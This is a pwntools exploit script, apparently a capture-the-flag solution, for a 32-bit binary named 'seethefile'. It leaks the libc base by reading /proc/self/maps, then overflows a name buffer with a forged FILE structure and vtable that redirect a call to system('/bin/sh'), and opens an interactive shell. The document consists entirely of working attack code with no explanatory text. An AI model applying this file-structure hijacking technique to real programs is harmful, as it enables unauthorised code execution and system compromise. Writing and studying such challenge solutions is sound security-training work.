from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './seethefile_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
libc = ELF('./libc_32.so.6', checksec=False)
rop = ROP(elf)
p = start()
def open(filename):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b" see :", filename)

def read():
    p.sendlineafter(b"Your choice :", b"2")

def write():
    p.sendlineafter(b"Your choice :", b"3")

def close():
    p.sendlineafter(b"Your choice :", b"4")

def exit(name):
    p.sendlineafter(b"Your choice :", b"5")
    p.sendlineafter(b" name :", name)

open(b"/proc/self/maps")
read()
if args.GDB:
    read()
if args.LOCAL:
    read()

write()
p.recvuntil(b"[heap]\n")
libc.address = int(p.recv(8), 16) + 0x1000
info("libc.address: " + hex(libc.address))
system = libc.symbols['system']
_fake_struct = b'/bin/sh\x00'
_fake_struct += p32(0x0) *16
_fake_struct += p32(elf.symbols['name'])
_fake_struct += p32(0x0) * 18
_fake_struct += p32(elf.symbols['name'] + 188)
_fake_vtable = p32(0x0) * 17
_fake_vtable += p32(system)
payload = p32(0) * 8
payload += p32(elf.symbols['name'] + 36)
payload += _fake_struct
payload += _fake_vtable
exit(payload)
p.sendlineafter(b'next time',b'ls')
p.interactive()